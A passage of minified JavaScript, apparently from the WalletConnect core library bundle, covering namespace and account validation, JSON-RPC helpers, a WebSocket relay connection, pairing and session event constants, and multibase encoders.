            return !(!t || !zg(e)) || "number" == typeof e && !isNaN(e)
        }
        function qg(e) {
            return !(!Vg(e, !1) || !e.includes(":")) && 2 === e.split(":").length
        }
        function Gg(e) {
            let t = !0;
            return Lg(e) ? e.length && (t = e.every((e => Vg(e, !1)))) : t = !1,
            t
        }
        function $g(e, t, r) {
            let n = null;
            return Object.entries(e).forEach((e => {
                let[o,i] = e;
                if (n)
                    return;
                const s = function(e, t, r) {
                    let n = null;
                    return Lg(t) && t.length ? t.forEach((e => {
                        n || qg(e) || (n = Dg("UNSUPPORTED_CHAINS", "".concat(r, ", chain ").concat(e, ' should be a string and conform to "namespace:chainId" format')))
                    }
                    )) : qg(e) || (n = Dg("UNSUPPORTED_CHAINS", "".concat(r, ', chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }'))),
                    n
                }(o, Nl(o, i), "".concat(t, " ").concat(r));
                s && (n = s)
            }
            )),
            n
        }
        function Kg(e, t) {
            let r = null;
            return Lg(e) ? e.forEach((e => {
                r || function(e) {
                    if (Vg(e, !1) && e.includes(":")) {
                        const t = e.split(":");
                        if (3 === t.length) {
                            const e = t[0] + ":" + t[1];
                            return !!t[2] && qg(e)
                        }
                    }
                    return !1
                }(e) || (r = Dg("UNSUPPORTED_ACCOUNTS", "".concat(t, ", account ").concat(e, ' should be a string and conform to "namespace:chainId:address" format')))
            }
            )) : r = Dg("UNSUPPORTED_ACCOUNTS", "".concat(t, ', accounts should be an array of strings conforming to "namespace:chainId:address" format')),
            r
        }
        function Zg(e, t) {
            let r = null;
            return Object.values(e).forEach((e => {
                if (r)
                    return;
                const n = function(e, t) {
                    let r = null;
                    return Gg(null === e || void 0 === e ? void 0 : e.methods) ? Gg(null === e || void 0 === e ? void 0 : e.events) || (r = Dg("UNSUPPORTED_EVENTS", "".concat(t, ", events should be an array of strings or empty array for no events"))) : r = Dg("UNSUPPORTED_METHODS", "".concat(t, ", methods should be an array of strings or empty array for no methods")),
                    r
                }(e, "".concat(t, ", namespace"));
                n && (r = n)
            }
            )),
            r
        }
        function Yg(e, t) {
            let r = null;
            if (e && jg(e)) {
                const n = Zg(e, t);
                n && (r = n);
                const o = function(e, t) {
                    let r = null;
                    return Object.values(e).forEach((e => {
                        if (r)
                            return;
                        const n = Kg(null === e || void 0 === e ? void 0 : e.accounts, "".concat(t, " namespace"));
                        n && (r = n)
                    }
                    )),
                    r
                }(e, t);
                o && (r = o)
            } else
                r = Ug("MISSING_OR_INVALID", "".concat(t, ", namespaces should be an object with data"));
            return r
        }
        function Jg(e) {
            return Vg(e.protocol, !0)
        }
        function Xg(e) {
            return typeof e < "u" && null !== typeof e
        }
        function Qg(e, t) {
            return !(!qg(t) || !function(e) {
                const t = [];
                return Object.values(e).forEach((e => {
                    t.push(..._g(e.accounts))
                }
                )),
                t
            }(e).includes(t))
        }
        function ey(e, t, r) {
            return !!Vg(r, !1) && function(e, t) {
                const r = [];
                return Object.values(e).forEach((e => {
                    _g(e.accounts).includes(t) && r.push(...e.methods)
                }
                )),
                r
            }(e, t).includes(r)
        }
        function ty(e, t, r) {
            return !!Vg(r, !1) && function(e, t) {
                const r = [];
                return Object.values(e).forEach((e => {
                    _g(e.accounts).includes(t) && r.push(...e.events)
                }
                )),
                r
            }(e, t).includes(r)
        }
        function ry(e, t, r) {
            let n = null;
            const o = function(e) {
                const t = {};
                return Object.keys(e).forEach((r => {
                    var n;
                    r.includes(":") ? t[r] = e[r] : null == (n = e[r].chains) || n.forEach((n => {
                        t[n] = {
                            methods: e[r].methods,
                            events: e[r].events
                        }
                    }
                    ))
                }
                )),
                t
            }(e)
              , i = function(e) {
                const t = {};
                return Object.keys(e).forEach((r => {
                    if (r.includes(":"))
                        t[r] = e[r];
                    else {
                        const n = _g(e[r].accounts);
                        null === n || void 0 === n || n.forEach((n => {
                            t[n] = {
                                accounts: e[r].accounts.filter((e => e.includes("".concat(n, ":")))),
                                methods: e[r].methods,
                                events: e[r].events
                            }
                        }
                        ))
                    }
                }
                )),
                t
            }(t)
              , s = Object.keys(o)
              , a = Object.keys(i)
              , c = ny(Object.keys(e))
              , l = ny(Object.keys(t))
              , u = c.filter((e => !l.includes(e)));
            return u.length && (n = Ug("NON_CONFORMING_NAMESPACES", "".concat(r, " namespaces keys don't satisfy requiredNamespaces.\n      Required: ").concat(u.toString(), "\n      Received: ").concat(Object.keys(t).toString()))),
            iu(s, a) || (n = Ug("NON_CONFORMING_NAMESPACES", "".concat(r, " namespaces chains don't satisfy required namespaces.\n      Required: ").concat(s.toString(), "\n      Approved: ").concat(a.toString()))),
            Object.keys(t).forEach((e => {
                if (!e.includes(":") || n)
                    return;
                const o = _g(t[e].accounts);
                o.includes(e) || (n = Ug("NON_CONFORMING_NAMESPACES", "".concat(r, " namespaces accounts don't satisfy namespace accounts for ").concat(e, "\n        Required: ").concat(e, "\n        Approved: ").concat(o.toString())))
            }
            )),
            s.forEach((e => {
                n || (iu(o[e].methods, i[e].methods) ? iu(o[e].events, i[e].events) || (n = Ug("NON_CONFORMING_NAMESPACES", "".concat(r, " namespaces events don't satisfy namespace events for ").concat(e))) : n = Ug("NON_CONFORMING_NAMESPACES", "".concat(r, " namespaces methods don't satisfy namespace methods for ").concat(e)))
            }
            )),
            n
        }
        function ny(e) {
            return [...new Set(e.map((e => e.includes(":") ? e.split(":")[0] : e)))]
        }
        function oy() {
            const e = Ql();
            return new Promise((t => {
                switch (e) {
                case $l:
                    t(function() {
                        var e;
                        return Xl() && (null === (e = navigator) || void 0 === e ? void 0 : e.onLine)
                    }());
                    break;
                case ql:
                    t(async function() {
                        if (Jl() && typeof r.g < "u" && null != r.g && r.g.NetInfo) {
                            const e = await (null == r.g ? void 0 : r.g.NetInfo.fetch());
                            return null === e || void 0 === e ? void 0 : e.isConnected
                        }
                        return !0
                    }());
                    break;
                default:
                    t(!0)
                }
            }
            ))
        }
        function iy(e) {
            switch (Ql()) {
            case $l:
                !function(e) {
                    !Jl() && Xl() && (window.addEventListener("online", ( () => e(!0))),
                    window.addEventListener("offline", ( () => e(!1))))
                }(e);
                break;
            case ql:
                !function(e) {
                    var t;
                    Jl() && typeof r.g < "u" && null != r.g && r.g.NetInfo && (null === (t = r.g) || void 0 === t || t.NetInfo.addEventListener((t => e(null === t || void 0 === t ? void 0 : t.isConnected))))
                }(e)
            }
        }
        const sy = {};
        class ay {
            static get(e) {
                return sy[e]
            }
            static set(e, t) {
                sy[e] = t
            }
            static delete(e) {
                delete sy[e]
            }
        }
        function cy(e) {
            let {publicKey: t, signature: r, payload: n} = e;
            var o;
            const i = ly(n.method)
              , s = 128 | parseInt((null == (o = n.version) ? void 0 : o.toString()) || "4")
              , a = function(e) {
                const t = zs.decode(e)[0];
                return 42 === t ? 0 : 60 === t ? 2 : 1
            }(n.address)
              , c = "00" === n.era ? new Uint8Array([0]) : ly(n.era);
            if (1 !== c.length && 2 !== c.length)
                throw new Error("Invalid era length");
            const l = parseInt(n.nonce, 16)
              , u = new Uint8Array([255 & l, l >> 8 & 255])
              , d = BigInt("0x".concat(function(e) {
                return e.startsWith("0x") ? e.slice(2) : e
            }(n.tip)))
              , h = function(e) {
                if (e < BigInt(1) << BigInt(6))
                    return new Uint8Array([Number(e << BigInt(2))]);
                if (e < BigInt(1) << BigInt(14)) {
                    const t = e << BigInt(2) | BigInt(1);
                    return new Uint8Array([Number(t & BigInt(255)), Number(t >> BigInt(8) & BigInt(255))])
                }
                if (e < BigInt(1) << BigInt(30)) {
                    const t = e << BigInt(2) | BigInt(2);
                    return new Uint8Array([Number(t & BigInt(255)), Number(t >> BigInt(8) & BigInt(255)), Number(t >> BigInt(16) & BigInt(255)), Number(t >> BigInt(24) & BigInt(255))])
                }
                throw new Error("BigInt compact encoding not supported > 2^30")
            }(d)
              , f = new Uint8Array([0, ...t, a, ...r, ...c, ...u, ...h, ...i])
              , p = function(e) {
                if (e < 64)
                    return new Uint8Array([e << 2]);
                if (e < 16384) {
                    const t = e << 2 | 1;
                    return new Uint8Array([255 & t, t >> 8 & 255])
                }
                if (e < 1 << 30) {
                    const t = e << 2 | 2;
                    return new Uint8Array([255 & t, t >> 8 & 255, t >> 16 & 255, t >> 24 & 255])
                }
                throw new Error("Compact encoding > 2^30 not supported")
            }(f.length + 1);
            return new Uint8Array([...p, s, ...f])
        }
        function ly(e) {
            return new Uint8Array(e.replace(/^0x/, "").match(/.{1,2}/g).map((e => parseInt(e, 16))))
        }
        function uy(e) {
            const t = Uint8Array.from(Buffer.from(e.signature, "hex"))
              , r = function(e) {
                const t = zs.decode(e);
                if (t.length < 33)
                    throw new Error("Too short to contain a public key");
                return t.slice(1, 33)
            }(e.transaction.address)
              , n = cy({
                publicKey: r,
                signature: t,
                payload: e.transaction
            });
            return function(e) {
                const t = ly(e)
                  , r = (0,
                Rl.blake2b)(t, void 0, 32);
                return "0x" + Buffer.from(r).toString("hex")
            }(Buffer.from(n).toString("hex"))
        }
        const dy = "PARSE_ERROR"
          , hy = "INVALID_REQUEST"
          , fy = "METHOD_NOT_FOUND"
          , py = "INVALID_PARAMS"
          , gy = "INTERNAL_ERROR"
          , yy = "SERVER_ERROR"
          , my = [-32700, -32600, -32601, -32602, -32603]
          , by = {
            [dy]: {
                code: -32700,
                message: "Parse error"
            },
            [hy]: {
                code: -32600,
                message: "Invalid Request"
            },
            [fy]: {
                code: -32601,
                message: "Method not found"
            },
            [py]: {
                code: -32602,
                message: "Invalid params"
            },
            [gy]: {
                code: -32603,
                message: "Internal error"
            },
            [yy]: {
                code: -32e3,
                message: "Server error"
            }
        }
          , vy = yy;
        function wy(e) {
            return my.includes(e)
        }
        function Ty(e) {
            return Object.keys(by).includes(e) ? by[e] : by[vy]
        }
        function Ay(e) {
            const t = Object.values(by).find((t => t.code === e));
            return t || by[vy]
        }
        function Ey(e, t, r) {
            return e.message.includes("getaddrinfo ENOTFOUND") || e.message.includes("connect ECONNREFUSED") ? new Error("Unavailable ".concat(r, " RPC url at ").concat(t)) : e
        }
        var Py = r(8129);
        function Cy() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 3;
            return Date.now() * Math.pow(10, e) + Math.floor(Math.random() * Math.pow(10, e))
        }
        function Sy() {
            return BigInt(Cy(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 6))
        }
        function Iy(e, t, r) {
            return {
                id: r || Cy(),
                jsonrpc: "2.0",
                method: e,
                params: t
            }
        }
        function By(e, t) {
            return {
                id: e,
                jsonrpc: "2.0",
                result: t
            }
        }
        function xy(e, t, r) {
            return {
                id: e,
                jsonrpc: "2.0",
                error: Oy(t, r)
            }
        }
        function Oy(e, t) {
            return "undefined" === typeof e ? Ty(gy) : ("string" === typeof e && (e = Object.assign(Object.assign({}, Ty(yy)), {
                message: e
            })),
            "undefined" !== typeof t && (e.data = t),
            wy(e.code) && (e = Ay(e.code)),
            e)
        }
        class _y {
        }
        class Wy extends _y {
            constructor() {
                super()
            }
        }
        class Ry extends Wy {
            constructor(e) {
                super()
            }
        }
        function ky(e, t) {
            const r = function(e) {
                const t = e.match(new RegExp(/^\w+:/,"gi"));
                if (t && t.length)
                    return t[0]
            }(e);
            return "undefined" !== typeof r && new RegExp(t).test(r)
        }
        function My(e) {
            return ky(e, "^https?:")
        }
        function Ny(e) {
            return ky(e, "^wss?:")
        }
        function Fy(e) {
            return "object" === typeof e && "id"in e && "jsonrpc"in e && "2.0" === e.jsonrpc
        }
        function Uy(e) {
            return Fy(e) && "method"in e
        }
        function Dy(e) {
            return Fy(e) && (Ly(e) || jy(e))
        }
        function Ly(e) {
            return "result"in e
        }
        function jy(e) {
            return "error"in e
        }
        class zy extends Ry {
            constructor(e) {
                super(e),
                this.events = new Se.EventEmitter,
                this.hasRegisteredEventListeners = !1,
                this.connection = this.setConnection(e),
                this.connection.connected && this.registerEventListeners()
            }
            async connect() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.connection;
                await this.open(e)
            }
            async disconnect() {
                await this.close()
            }
            on(e, t) {
                this.events.on(e, t)
            }
            once(e, t) {
                this.events.once(e, t)
            }
            off(e, t) {
                this.events.off(e, t)
            }
            removeListener(e, t) {
                this.events.removeListener(e, t)
            }
            async request(e, t) {
                return this.requestStrict(Iy(e.method, e.params || [], e.id || Sy().toString()), t)
            }
            async requestStrict(e, t) {
                return new Promise((async (r, n) => {
                    if (!this.connection.connected)
                        try {
                            await this.open()
                        } catch (Oe) {
                            n(Oe)
                        }
                    this.events.on("".concat(e.id), (e => {
                        jy(e) ? n(e.error) : r(e.result)
                    }
                    ));
                    try {
                        await this.connection.send(e, t)
                    } catch (Oe) {
                        n(Oe)
                    }
                }
                ))
            }
            setConnection() {
                return arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.connection
            }
            onPayload(e) {
                this.events.emit("payload", e),
                Dy(e) ? this.events.emit("".concat(e.id), e) : this.events.emit("message", {
                    type: e.method,
                    data: e.params
                })
            }
            onClose(e) {
                e && 3e3 === e.code && this.events.emit("error", new Error("WebSocket connection closed abnormally with code: ".concat(e.code, " ").concat(e.reason ? "(".concat(e.reason, ")") : ""))),
                this.events.emit("disconnect")
            }
            async open() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.connection;
                this.connection === e && this.connection.connected || (this.connection.connected && this.close(),
                "string" == typeof e && (await this.connection.open(e),
                e = this.connection),
                this.connection = this.setConnection(e),
                await this.connection.open(),
                this.registerEventListeners(),
                this.events.emit("connect"))
            }
            async close() {
                await this.connection.close()
            }
            registerEventListeners() {
                this.hasRegisteredEventListeners || (this.connection.on("payload", (e => this.onPayload(e))),
                this.connection.on("close", (e => this.onClose(e))),
                this.connection.on("error", (e => this.events.emit("error", e))),
                this.connection.on("register_error", (e => this.onClose())),
                this.hasRegisteredEventListeners = !0)
            }
        }
        const Vy = e => e.split("?")[0]
          , Hy = typeof WebSocket < "u" ? WebSocket : typeof r.g < "u" && typeof r.g.WebSocket < "u" ? r.g.WebSocket : typeof window < "u" && typeof window.WebSocket < "u" ? window.WebSocket : typeof self < "u" && typeof self.WebSocket < "u" ? self.WebSocket : r(1198);
        class qy {
            constructor(e) {
                if (this.url = e,
                this.events = new Se.EventEmitter,
                this.registering = !1,
                !Ny(e))
                    throw new Error("Provided URL is not compatible with WebSocket connection: ".concat(e));
                this.url = e
            }
            get connected() {
                return typeof this.socket < "u"
            }
            get connecting() {
                return this.registering
            }
            on(e, t) {
                this.events.on(e, t)
            }
            once(e, t) {
                this.events.once(e, t)
            }
            off(e, t) {
                this.events.off(e, t)
            }
            removeListener(e, t) {
                this.events.removeListener(e, t)
            }
            async open() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.url;
                await this.register(e)
            }
            async close() {
                return new Promise(( (e, t) => {
                    typeof this.socket > "u" ? t(new Error("Connection already closed")) : (this.socket.onclose = t => {
                        this.onClose(t),
                        e()
                    }
                    ,
                    this.socket.close())
                }
                ))
            }
            async send(e) {
                typeof this.socket > "u" && (this.socket = await this.register());
                try {
                    this.socket.send(ot(e))
                } catch (cf) {
                    this.onError(e.id, cf)
                }
            }
            register() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.url;
                if (!Ny(e))
                    throw new Error("Provided URL is not compatible with WebSocket connection: ".concat(e));
                if (this.registering) {
                    const e = this.events.getMaxListeners();
                    return (this.events.listenerCount("register_error") >= e || this.events.listenerCount("open") >= e) && this.events.setMaxListeners(e + 1),
                    new Promise(( (e, t) => {
                        this.events.once("register_error", (e => {
                            this.resetMaxListeners(),
                            t(e)
                        }
                        )),
                        this.events.once("open", ( () => {
                            if (this.resetMaxListeners(),
                            typeof this.socket > "u")
                                return t(new Error("WebSocket connection is missing or invalid"));
                            e(this.socket)
                        }
                        ))
                    }
                    ))
                }
                return this.url = e,
                this.registering = !0,
                new Promise(( (t, n) => {
                    const o = (0,
                    Py.isReactNative)() ? void 0 : {
                        rejectUnauthorized: (s = e,
                        !new RegExp("wss?://localhost(:d{2,5})?").test(s))
                    }
                      , i = new Hy(e,[],o);
                    var s;
                    typeof WebSocket < "u" || typeof r.g < "u" && typeof r.g.WebSocket < "u" || typeof window < "u" && typeof window.WebSocket < "u" || typeof self < "u" && typeof self.WebSocket < "u" ? i.onerror = e => {
                        const t = e;
                        n(this.emitError(t.error))
                    }
                    : i.on("error", (e => {
                        n(this.emitError(e))
                    }
                    )),
                    i.onopen = () => {
                        this.onOpen(i),
                        t(i)
                    }
                }
                ))
            }
            onOpen(e) {
                e.onmessage = e => this.onPayload(e),
                e.onclose = e => this.onClose(e),
                this.socket = e,
                this.registering = !1,
                this.events.emit("open")
            }
            onClose(e) {
                this.socket = void 0,
                this.registering = !1,
                this.events.emit("close", e)
            }
            onPayload(e) {
                if (typeof e.data > "u")
                    return;
                const t = "string" == typeof e.data ? nt(e.data) : e.data;
                this.events.emit("payload", t)
            }
            onError(e, t) {
                const r = this.parseError(t)
                  , n = xy(e, r.message || r.toString());
                this.events.emit("payload", n)
            }
            parseError(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.url;
                return Ey(e, Vy(t), "WS")
            }
            resetMaxListeners() {
                this.events.getMaxListeners() > 10 && this.events.setMaxListeners(10)
            }
            emitError(e) {
                const t = this.parseError(new Error((null === e || void 0 === e ? void 0 : e.message) || "WebSocket connection failed for host: ".concat(Vy(this.url))));
                return this.events.emit("register_error", t),
                t
            }
        }
        const Gy = "core"
          , $y = "".concat("wc", "@2:").concat(Gy, ":")
          , Ky = "error"
          , Zy = {
            database: ":memory:"
        }
          , Yy = "client_ed25519_seed"
          , Jy = Be.ONE_DAY
          , Xy = Be.SIX_HOURS
          , Qy = "wss://relay.walletconnect.org"
          , em = "relayer_message"
          , tm = "relayer_message_ack"
          , rm = "relayer_connect"
          , nm = "relayer_disconnect"
          , om = "relayer_error"
          , im = "relayer_connection_stalled"
          , sm = "relayer_publish"
          , am = "payload"
          , cm = "connect"
          , lm = "disconnect"
          , um = "error"
          , dm = "2.21.2"
          , hm = {
            link_mode: "link_mode",
            relay: "relay"
        }
          , fm = "inbound"
          , pm = "outbound"
          , gm = "WALLETCONNECT_LINK_MODE_APPS"
          , ym = "subscription_created"
          , mm = "subscription_deleted"
          , bm = "subscription_sync"
          , vm = "subscription_resubscribed"
          , wm = (Be.FIVE_SECONDS,
        {
            wc_pairingDelete: {
                req: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1e3
                },
                res: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1001
                }
            },
            wc_pairingPing: {
                req: {
                    ttl: Be.THIRTY_SECONDS,
                    prompt: !1,
                    tag: 1002
                },
                res: {
                    ttl: Be.THIRTY_SECONDS,
                    prompt: !1,
                    tag: 1003
                }
            },
            unregistered_method: {
                req: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 0
                },
                res: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 0
                }
            }
        })
          , Tm = "pairing_create"
          , Am = "pairing_expire"
          , Em = "pairing_delete"
          , Pm = "pairing_ping"
          , Cm = "history_created"
          , Sm = "history_updated"
          , Im = "history_deleted"
          , Bm = "history_sync"
          , xm = "expirer_created"
          , Om = "expirer_deleted"
          , _m = "expirer_expired"
          , Wm = "expirer_sync"
          , Rm = "https://verify.walletconnect.org"
          , km = Rm
          , Mm = "".concat(km, "/v3")
          , Nm = ["https://verify.walletconnect.com", Rm]
          , Fm = "pairing_started"
          , Um = "pairing_uri_validation_success"
          , Dm = "pairing_uri_not_expired"
          , Lm = "store_new_pairing"
          , jm = "subscribing_pairing_topic"
          , zm = "subscribe_pairing_topic_success"
          , Vm = "existing_pairing"
          , Hm = "pairing_not_expired"
          , qm = "emit_inactive_pairing"
          , Gm = "emit_session_proposal"
          , $m = "no_internet_connection"
          , Km = "malformed_pairing_uri"
          , Zm = "active_pairing_already_exists"
          , Ym = "subscribe_pairing_topic_failure"
          , Jm = "pairing_expired"
          , Xm = "proposal_listener_not_found"
          , Qm = "session_approve_started"
          , eb = "session_namespaces_validation_success"
          , tb = "subscribing_session_topic"
          , rb = "subscribe_session_topic_success"
          , nb = "publishing_session_approve"
          , ob = "session_approve_publish_success"
          , ib = "store_session"
          , sb = "publishing_session_settle"
          , ab = "session_settle_publish_success"
          , cb = "no_internet_connection"
          , lb = "proposal_expired"
          , ub = "subscribe_session_topic_failure"
          , db = "session_approve_publish_failure"
          , hb = "session_settle_publish_failure"
          , fb = "session_approve_namespace_validation_failure"
          , pb = "proposal_not_found"
          , gb = "authenticated_session_approve_started"
          , yb = "create_authenticated_session_topic"
          , mb = "cacaos_verified"
          , bb = "store_authenticated_session"
          , vb = "subscribing_authenticated_session_topic"
          , wb = "subscribe_authenticated_session_topic_success"
          , Tb = "publishing_authenticated_session_approve"
          , Ab = "no_internet_connection"
          , Eb = "invalid_cacao"
          , Pb = "subscribe_authenticated_session_topic_failure"
          , Cb = "authenticated_session_approve_publish_failure"
          , Sb = "authenticated_session_pending_request_not_found";
        var Ib = function(e, t) {
            if (e.length >= 255)
                throw new TypeError("Alphabet too long");
            for (var r = new Uint8Array(256), n = 0; n < r.length; n++)
                r[n] = 255;
            for (var o = 0; o < e.length; o++) {
                var i = e.charAt(o)
                  , s = i.charCodeAt(0);
                if (255 !== r[s])
                    throw new TypeError(i + " is ambiguous");
                r[s] = o
            }
            var a = e.length
              , c = e.charAt(0)
              , l = Math.log(a) / Math.log(256)
              , u = Math.log(256) / Math.log(a);
            function d(e) {
                if ("string" != typeof e)
                    throw new TypeError("Expected String");
                if (0 === e.length)
                    return new Uint8Array;
                var t = 0;
                if (" " !== e[t]) {
                    for (var n = 0, o = 0; e[t] === c; )
                        n++,
                        t++;
                    for (var i = (e.length - t) * l + 1 >>> 0, s = new Uint8Array(i); e[t]; ) {
                        var u = r[e.charCodeAt(t)];
                        if (255 === u)
                            return;
                        for (var d = 0, h = i - 1; (0 !== u || d < o) && -1 !== h; h--,
                        d++)
                            u += a * s[h] >>> 0,
                            s[h] = u % 256 >>> 0,
                            u = u / 256 >>> 0;
                        if (0 !== u)
                            throw new Error("Non-zero carry");
                        o = d,
                        t++
                    }
                    if (" " !== e[t]) {
                        for (var f = i - o; f !== i && 0 === s[f]; )
                            f++;
                        for (var p = new Uint8Array(n + (i - f)), g = n; f !== i; )
                            p[g++] = s[f++];
                        return p
                    }
                }
            }
            return {
                encode: function(t) {
                    if (t instanceof Uint8Array || (ArrayBuffer.isView(t) ? t = new Uint8Array(t.buffer,t.byteOffset,t.byteLength) : Array.isArray(t) && (t = Uint8Array.from(t))),
                    !(t instanceof Uint8Array))
                        throw new TypeError("Expected Uint8Array");
                    if (0 === t.length)
                        return "";
                    for (var r = 0, n = 0, o = 0, i = t.length; o !== i && 0 === t[o]; )
                        o++,
                        r++;
                    for (var s = (i - o) * u + 1 >>> 0, l = new Uint8Array(s); o !== i; ) {
                        for (var d = t[o], h = 0, f = s - 1; (0 !== d || h < n) && -1 !== f; f--,
                        h++)
                            d += 256 * l[f] >>> 0,
                            l[f] = d % a >>> 0,
                            d = d / a >>> 0;
                        if (0 !== d)
                            throw new Error("Non-zero carry");
                        n = h,
                        o++
                    }
                    for (var p = s - n; p !== s && 0 === l[p]; )
                        p++;
                    for (var g = c.repeat(r); p < s; ++p)
                        g += e.charAt(l[p]);
                    return g
                },
                decodeUnsafe: d,
                decode: function(e) {
                    var r = d(e);
                    if (r)
                        return r;
                    throw new Error("Non-".concat(t, " character"))
                }
            }
        }
          , Bb = Ib;
        const xb = e => {
            if (e instanceof Uint8Array && "Uint8Array" === e.constructor.name)
                return e;
            if (e instanceof ArrayBuffer)
                return new Uint8Array(e);
            if (ArrayBuffer.isView(e))
                return new Uint8Array(e.buffer,e.byteOffset,e.byteLength);
            throw new Error("Unknown type, must be binary type")
        }
        ;
        class Ob {
            constructor(e, t, r) {
                this.name = e,
                this.prefix = t,
                this.baseEncode = r
            }
            encode(e) {
                if (e instanceof Uint8Array)
                    return "".concat(this.prefix).concat(this.baseEncode(e));
                throw Error("Unknown type, must be binary type")
            }
        }
        class _b {
            constructor(e, t, r) {
                if (this.name = e,
                this.prefix = t,
                void 0 === t.codePointAt(0))
                    throw new Error("Invalid prefix character");
                this.prefixCodePoint = t.codePointAt(0),
                this.baseDecode = r
            }
            decode(e) {
                if ("string" == typeof e) {
                    if (e.codePointAt(0) !== this.prefixCodePoint)
                        throw Error("Unable to decode multibase string ".concat(JSON.stringify(e), ", ").concat(this.name, " decoder only supports inputs prefixed with ").concat(this.prefix));
                    return this.baseDecode(e.slice(this.prefix.length))
                }
                throw Error("Can only multibase decode strings")
            }
            or(e) {
                return Rb(this, e)
            }
        }
        class Wb {
            constructor(e) {
                this.decoders = e
            }
            or(e) {
                return Rb(this, e)
            }
            decode(e) {
                const t = e[0]
                  , r = this.decoders[t];
                if (r)
                    return r.decode(e);
                throw RangeError("Unable to decode multibase string ".concat(JSON.stringify(e), ", only inputs prefixed with ").concat(Object.keys(this.decoders), " are supported"))
            }
        }
        const Rb = (e, t) => new Wb((0,
        k.A)((0,
        k.A)({}, e.decoders || {
            [e.prefix]: e
        }), t.decoders || {
            [t.prefix]: t
        }));
        class kb {
            constructor(e, t, r, n) {
                this.name = e,
                this.prefix = t,
                this.baseEncode = r,
                this.baseDecode = n,
                this.encoder = new Ob(e,t,r),
                this.decoder = new _b(e,t,n)
            }
            encode(e) {
                return this.encoder.encode(e)
            }
            decode(e) {
                return this.decoder.decode(e)
            }
        }
        const Mb = e => {
            let {name: t, prefix: r, encode: n, decode: o} = e;
            return new kb(t,r,n,o)
        }
          , Nb = e => {
            let {prefix: t, name: r, alphabet: n} = e;
            const {encode: o, decode: i} = Bb(n, r);
            return Mb({
                prefix: t,
                name: r,
                encode: o,
                decode: e => xb(i(e))
            })
        }
          , Fb = e => {
            let {name: t, prefix: r, bitsPerChar: n, alphabet: o} = e;
            return Mb({
                prefix: r,
                name: t,
                encode: e => ( (e, t, r) => {
                    const n = "=" === t[t.length - 1]
                      , o = (1 << r) - 1;
                    let i = ""
                      , s = 0
                      , a = 0;
                    for (let c = 0; c < e.length; ++c)
                        for (a = a << 8 | e[c],
                        s += 8; s > r; )
                            s -= r,
                            i += t[o & a >> s];
                    if (s && (i += t[o & a << r - s]),
                    n)
                        for (; i.length * r & 7; )
                            i += "=";
                    return i
                }
                )(e, o, n),
                decode: e => ( (e, t, r, n) => {
                    const o = {};
                    for (let u = 0; u < t.length; ++u)
                        o[t[u]] = u;
                    let i = e.length;
                    for (; "=" === e[i - 1]; )
                        --i;
                    const s = new Uint8Array(i * r / 8 | 0);
                    let a = 0
                      , c = 0
                      , l = 0;
                    for (let u = 0; u < i; ++u) {
                        const t = o[e[u]];
                        if (void 0 === t)
                            throw new SyntaxError("Non-".concat(n, " character"));
                        c = c << r | t,
                        a += r,
                        a >= 8 && (a -= 8,
                        s[l++] = 255 & c >> a)
                    }
                    if (a >= r || 255 & c << 8 - a)
                        throw new SyntaxError("Unexpected end of data");
                    return s
                }
                )(e, o, n, t)
            })
        }
          , Ub = Mb({
            prefix: "\0",
            name: "identity",
            encode: e => (e => (new TextDecoder).decode(e))(e),
            decode: e => (e => (new TextEncoder).encode(e))(e)
        });
        var Db = Object.freeze({
            __proto__: null,
            identity: Ub
        });
        const Lb = Fb({
            prefix: "0",
            name: "base2",
            alphabet: "01",
            bitsPerChar: 1
        });
        var jb = Object.freeze({
            __proto__: null,
            base2: Lb
        });
        const zb = Fb({
            prefix: "7",
            name: "base8",
            alphabet: "01234567",
            bitsPerChar: 3
        });
        var Vb = Object.freeze({
            __proto__: null,
            base8: zb
        });
        const Hb = Nb({
            prefix: "9",
            name: "base10",
            alphabet: "0123456789"
        });
        var qb = Object.freeze({
            __proto__: null,
            base10: Hb
        });
        const Gb = Fb({
            prefix: "f",
            name: "base16",
            alphabet: "0123456789abcdef",
            bitsPerChar: 4
        })
          , $b = Fb({
            prefix: "F",
            name: "base16upper",
            alphabet: "0123456789ABCDEF",
            bitsPerChar: 4
        });
        var Kb = Object.freeze({
            __proto__: null,
            base16: Gb,
            base16upper: $b
        });
        const Zb = Fb({
            prefix: "b",
            name: "base32",
            alphabet: "abcdefghijklmnopqrstuvwxyz234567",
            bitsPerChar: 5
        })
          , Yb = Fb({
            prefix: "B",
            name: "base32upper",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
            bitsPerChar: 5
        })
          , Jb = Fb({
            prefix: "c",
            name: "base32pad",
            alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
            bitsPerChar: 5
        })
          , Xb = Fb({
            prefix: "C",
            name: "base32padupper",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
            bitsPerChar: 5
        })
          , Qb = Fb({
            prefix: "v",
            name: "base32hex",
            alphabet: "0123456789abcdefghijklmnopqrstuv",
            bitsPerChar: 5
        })
          , ev = Fb({
            prefix: "V",
            name: "base32hexupper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
            bitsPerChar: 5
        })
          , tv = Fb({
            prefix: "t",
            name: "base32hexpad",
            alphabet: "0123456789abcdefghijklmnopqrstuv=",
            bitsPerChar: 5
        })
          , rv = Fb({
            prefix: "T",
            name: "base32hexpadupper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
            bitsPerChar: 5
        })
          , nv = Fb({
            prefix: "h",
            name: "base32z",
            alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
            bitsPerChar: 5
        });
        var ov = Object.freeze({
            __proto__: null,
